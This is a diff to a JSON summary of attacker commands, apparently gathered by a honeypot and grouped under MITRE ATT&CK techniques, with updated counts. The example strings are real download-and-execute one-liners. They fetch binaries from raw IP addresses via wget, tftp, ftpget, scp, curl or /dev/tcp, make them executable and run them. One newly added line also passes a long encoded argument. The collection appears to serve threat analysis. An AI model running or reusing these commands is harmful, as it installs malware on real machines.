@@ -24,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 14543,
-      "distinct_ips": 600,
+      "count": 14556,
+      "distinct_ips": 602,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/; ",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/; ",
@@ -41,14 +41,14 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2806,
-      "distinct_ips": 430,
+      "count": 2807,
+      "distinct_ips": 431,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips"
+        "nohup $SHELL -c \"curl http://8.163.15.89:7214/linux -o /tmp/yesHGnqNNq; if [ ! -f /tmp/yesHGnqNNq ]; then wget http://8.163.15.89:7214/linux -O /tmp/yesHGnqNNq; fi; if [ ! -f /tmp/yesHGnqNNq ]; then exec 6<>/dev/tcp/8.163.15.89/7214 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/yesHGnqNNq ; chmod +x /tmp/yesHGnqNNq && /tmp/yesHGnqNNq qSytsCYuJrOuItzXIq61JTouua09xNU+rK4gNzmyrzvK1TuouiA0LrS8ONPKPq+5OTEut7I93dU2q7YiMDe4sj3S1yKttTk4LrqrPtXQLK20IS4itrI+1N0irbYnOi6zpD/E1TmuriQyObKoPMrVOqu6LjUitrw91NIirbU5NjmyrDne3TyvsDczLq6lO8rWOKquJTIguqU61dcsqLc5MSWysj3W1iKosS05JrauLNbWPLKxLzA5uaUi09U2qrAmMCKgqDvK1jiuriA0ObmvNtPTPqygJjInrq46ytU6qK4lNSW6pTXV3CytsCYuJbKrItDWIq21ITohuaQ7xNU8qq4mNTm5qSLW0D+muSQ1JaCoO8rVPK6uJjAlrqg53t08rLY3NCCupTrK1T2ori83LbeoOdXEPay2OTEirqU5ytY4r7ouMyKyvD3V0CKptTkxJ7OyOt3eO6uzJiAjt7I+0NcipbE5MiO5pjXX3Di8sSY1ObGlPcrRNLK3Jjoht68/xNA7srIjMjm3qCLd1zartyUwN7iyPdDcIq62OTkkuqU50tYsrbYuLiK4sjrcyjmsui41IrW8ONPKPayyOTEnsrI40d41rLAhIC+urTnRyjmrriUyIbqlPdTTLK2yJy4gt7I+19MirbcjOiC0pTjE0DuyuCMuJrmsItXQOqa5IjkkoKg7ytY/pa4mOSCurTXV3juqtScgJLmyPdTRIqS1OTQkuqs/3dwsrbAmLiWyqyLQ1iKttSE6IbmkO5TBR9afr4hW281w8vk=; fi; echo password > /tmp/.opass; chmod +x /tmp/yesHGnqNNq && /tmp/yesHGnqNNq qSytsCYuJrOuItzXIq61JTouua09xNU+rK4gNzmyrzvK1TuouiA0LrS8ONPKPq+5OTEut7I93dU2q7YiMDe4sj3S1yKttTk4LrqrPtXQLK20IS4itrI+1N0irbYnOi6zpD/E1TmuriQyObKoPMrVOqu6LjUitrw91NIirbU5NjmyrDne3TyvsDczLq6lO8rWOKquJTIguqU61dcsqLc5MSWysj3W1iKosS05JrauLNbWPLKxLzA5uaUi09U2qrAmMCKgqDvK1jiuriA0ObmvNtPTPqygJjInrq46ytU6qK4lNSW6pTXV3CytsCYuJbKrItDWIq21ITohuaQ7xNU8qq4mNTm5qSLW0D+muSQ1JaCoO8rVPK6uJjAlrqg53t08rLY3NCCupTrK1T2ori83LbeoOdXEPay2OTEirqU5ytY4r7ouMyKyvD3V0CKptTkxJ7OyOt3eO6uzJiAjt7I+0NcipbE5MiO5pjXX3Di8sSY1ObGlPcrRNLK3Jjoht68/xNA7srIjMjm3qCLd1zartyUwN7iyPdDcIq62OTkkuqU50tYsrbYuLiK4sjrcyjmsui41IrW8ONPKPayyOTEnsrI40d41rLAhIC+urTnRyjmrriUyIbqlPdTTLK2yJy4gt7I+19MirbcjOiC0pTjE0DuyuCMuJrmsItXQOqa5IjkkoKg7ytY/pa4mOSCurTXV3juqtScgJLmyPdTRIqS1OTQkuqs/3dwsrbAmLiWyqyLQ1iKttSE6IbmkO5TBR9afr4hW281w8vk=\" &"
       ]
     },
     {
@@ -184,6 +184,6 @@
       ]
     }
   ],
-  "total_commands": 389231,
-  "matched_commands": 140197
+  "total_commands": 389262,
+  "matched_commands": 140210
 }
